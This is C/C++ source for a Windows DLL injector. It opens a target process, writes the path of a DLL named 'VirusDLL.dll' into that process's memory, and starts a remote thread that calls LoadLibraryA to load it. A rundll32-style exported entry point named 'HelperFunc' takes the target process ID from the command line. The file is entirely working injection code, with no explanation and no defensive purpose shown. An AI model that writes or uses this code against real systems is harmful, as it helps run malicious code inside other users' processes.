#include <windows.h>
#include <winerror.h>
#include <stdlib.h>

void DllInjector(DWORD dwProcessID)
{
    char szDLLPathToInject[] = "C:\\Temp\\VirusDLL.dll";
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1;

    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE, dwProcessID);
    if (!hProcess)
        return;

    LPVOID lpRemoteMemory = VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate,
                                           MEM_COMMIT, PAGE_READWRITE);
    if (!lpRemoteMemory) {
        CloseHandle(hProcess);
        return;
    }

    SIZE_T bytesWritten = 0;
    WriteProcessMemory(hProcess, lpRemoteMemory, szDLLPathToInject,
                       nTotBytesToAllocate, &bytesWritten);

    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibrary) {
        VirtualFreeEx(hProcess, lpRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary,
                                        lpRemoteMemory, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFreeEx(hProcess, lpRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

extern "C" __declspec(dllexport) void WINAPI HelperFunc(
    HWND hwnd,
    HINSTANCE hinst,
    LPSTR lpszCmdLine,
    int nCmdShow)
{
    DWORD pid = atoi(lpszCmdLine);
    if (pid != 0)
        DllInjector(pid);
}